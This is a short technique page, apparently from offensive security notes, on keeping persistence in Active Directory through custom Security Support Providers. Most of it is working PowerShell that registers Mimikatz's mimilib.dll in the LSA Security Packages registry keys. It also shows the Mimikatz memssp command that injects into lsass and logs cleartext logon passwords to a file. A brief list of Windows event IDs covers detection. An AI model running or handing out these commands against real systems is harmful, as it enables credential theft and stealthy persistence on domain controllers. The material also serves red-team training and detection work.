---
title: "Custom SSPs"
description: "Persistence using custom Security Support Providers (SSPs)."
lead: "Using custom SSPs for persistence in Active Directory with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 50
toc: true
---

## General

- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection
- Some SSP packages by Microsoft are
  - NTLM
  - Kerberos
  - Wdigest
  - CredSSP
- Mimikatz provdes custom SSP - mimilib.dll
- This SSP logs local logons, service account and machine aacount passwords in clear text on the target server

## Exploitation

```powershell
# First way: drop mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# Second way: using mimikatz to inject into lsass (unstable with Server 2016)
Invoke-Mimikatz -Command '"misc::memssp"'

# All logons on the DC are logged to C:\Windows\system32\kiwissp.log
Get-Content C:\Windows\system32\kiwissp.log
```

## Detection

- Event IDs:
  - 4657: Audit creation/change of HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\SecurityPackages
  - 4624: Account Logon
  - 4634: Account Logoff
  - 4672: Admin Logon
